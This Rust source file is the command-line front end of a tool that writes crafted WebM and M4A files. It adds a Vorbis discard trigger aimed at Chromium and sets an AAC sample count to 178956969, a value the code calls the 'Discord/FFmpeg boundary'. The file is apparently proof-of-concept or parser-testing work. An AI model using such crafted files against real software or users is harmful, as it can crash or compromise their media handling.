mod m4a;
mod webm;

use anyhow::{Context, Result};
use clap::{Args, Parser, Subcommand};
use m4a::M4aOptions;
use serde::Serialize;
use sha2::{Digest, Sha256};
use std::fs;
use std::path::{Path, PathBuf};
use webm::WebmOptions;

#[derive(Parser, Debug)]
#[command(
    name = "media-gen",
    version,
    about = "Generate the WebM and M4A media-parser test cases"
)]
struct Cli {
    #[command(subcommand)]
    command: Command,
}

#[derive(Subcommand, Debug)]
enum Command {
    /// Add a Vorbis discard trigger compatible with old and current Chromium.
    Webm(WebmArgs),
    /// Replace an AAC MP4 sample table with a large constant sample count.
    M4a(M4aArgs),
}

#[derive(Args, Debug)]
struct WebmArgs {
    /// Existing WebM containing an A_VORBIS audio track.
    #[arg(short, long, value_name = "FILE")]
    input: PathBuf,
    /// Candidate WebM to write.
    #[arg(short, long, value_name = "FILE")]
    output: PathBuf,
    /// Optional JSON report path.
    #[arg(long, value_name = "FILE")]
    manifest: Option<PathBuf>,
    /// Front-discard value added to the final trigger packet.
    #[arg(long, visible_alias = "second-skip", default_value_t = 1)]
    trigger_skip: u64,
    /// Override the codec delay in frames. Normally read from CodecDelay.
    #[arg(long)]
    codec_delay: Option<u64>,
    /// Override the sample rate. Normally read from the WebM Audio track.
    #[arg(long)]
    sample_rate: Option<f64>,
    /// Allow overwriting an existing output or manifest.
    #[arg(long)]
    force: bool,
}

#[derive(Args, Debug)]
struct M4aArgs {
    /// Existing AAC/M4A seed with an explicit stsz table.
    #[arg(short, long, value_name = "FILE")]
    input: PathBuf,
    /// Candidate M4A to write.
    #[arg(short, long, value_name = "FILE")]
    output: PathBuf,
    /// Declared sample count. The pinned Discord/FFmpeg boundary is 178956969.
    #[arg(long, default_value_t = 178_956_969)]
    sample_count: u32,
    /// Move moov after mdat so the physical audio bytes occur before the metadata.
    #[arg(long)]
    moov_at_end: bool,
    /// Optional JSON report path.
    #[arg(long, value_name = "FILE")]
    manifest: Option<PathBuf>,
    /// Allow overwriting an existing output or manifest.
    #[arg(long)]
    force: bool,
}

#[derive(Serialize)]
struct Report {
    format: &'static str,
    input: String,
    output: String,
    input_size: usize,
    output_size: usize,
    input_sha256: String,
    output_sha256: String,
    details: serde_json::Value,
}

fn sha256(data: &[u8]) -> String {
    let mut digest = Sha256::new();
    digest.update(data);
    format!("{:x}", digest.finalize())
}

fn ensure_writable(path: &Path, force: bool) -> Result<()> {
    if path.exists() && !force {
        anyhow::bail!(
            "refusing to overwrite {}; pass --force to allow it",
            path.display()
        );
    }
    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent)
            .with_context(|| format!("creating output directory {}", parent.display()))?;
    }
    Ok(())
}

fn write_report(path: &Path, report: &Report, force: bool) -> Result<()> {
    ensure_writable(path, force)?;
    let text = serde_json::to_string_pretty(report).context("serializing JSON report")?;
    fs::write(path, format!("{text}\n")).with_context(|| format!("writing {}", path.display()))?;
    Ok(())
}

fn run_webm(args: WebmArgs) -> Result<()> {
    let input = args.input.canonicalize().context("resolving WebM input")?;
    let output = args.output;
    ensure_writable(&output, args.force)?;
    if let Some(manifest) = &args.manifest
        && manifest == &output
    {
        anyhow::bail!("output and manifest must be different files");
    }
    if let Some(manifest) = &args.manifest {
        ensure_writable(manifest, args.force)?;
    }
    let data = fs::read(&input).with_context(|| format!("reading {}", input.display()))?;
    let options = WebmOptions {
        trigger_skip: args.trigger_skip,
        codec_delay_frames: args.codec_delay,
        sample_rate: args.sample_rate,
    };
    let (candidate, details) = webm::make_candidate(&data, &options)
        .with_context(|| format!("mutating {}", input.display()))?;
    fs::write(&output, &candidate).with_context(|| format!("writing {}", output.display()))?;

    let report = Report {
        format: "webm-vorbis-discard-dual",
        input: input.display().to_string(),
        output: output.display().to_string(),
        input_size: data.len(),
        output_size: candidate.len(),
        input_sha256: sha256(&data),
        output_sha256: sha256(&candidate),
        details,
    };
    if let Some(manifest) = args.manifest {
        write_report(&manifest, &report, args.force)?;
    }
    println!("{}", serde_json::to_string_pretty(&report)?);
    Ok(())
}

fn run_m4a(args: M4aArgs) -> Result<()> {
    let input = args.input.canonicalize().context("resolving M4A input")?;
    let output = args.output;
    ensure_writable(&output, args.force)?;
    if let Some(manifest) = &args.manifest
        && manifest == &output
    {
        anyhow::bail!("output and manifest must be different files");
    }
    if let Some(manifest) = &args.manifest {
        ensure_writable(manifest, args.force)?;
    }
    let data = fs::read(&input).with_context(|| format!("reading {}", input.display()))?;
    let options = M4aOptions {
        sample_count: args.sample_count,
        moov_at_end: args.moov_at_end,
    };
    let (candidate, details) = m4a::make_candidate(&data, &options)
        .with_context(|| format!("mutating {}", input.display()))?;
    fs::write(&output, &candidate).with_context(|| format!("writing {}", output.display()))?;

    let report = Report {
        format: "m4a-constant-stsz",
        input: input.display().to_string(),
        output: output.display().to_string(),
        input_size: data.len(),
        output_size: candidate.len(),
        input_sha256: sha256(&data),
        output_sha256: sha256(&candidate),
        details,
    };
    if let Some(manifest) = args.manifest {
        write_report(&manifest, &report, args.force)?;
    }
    println!("{}", serde_json::to_string_pretty(&report)?);
    Ok(())
}

fn main() -> Result<()> {
    let cli = Cli::parse();
    match cli.command {
        Command::Webm(args) => run_webm(args),
        Command::M4a(args) => run_m4a(args),
    }
}
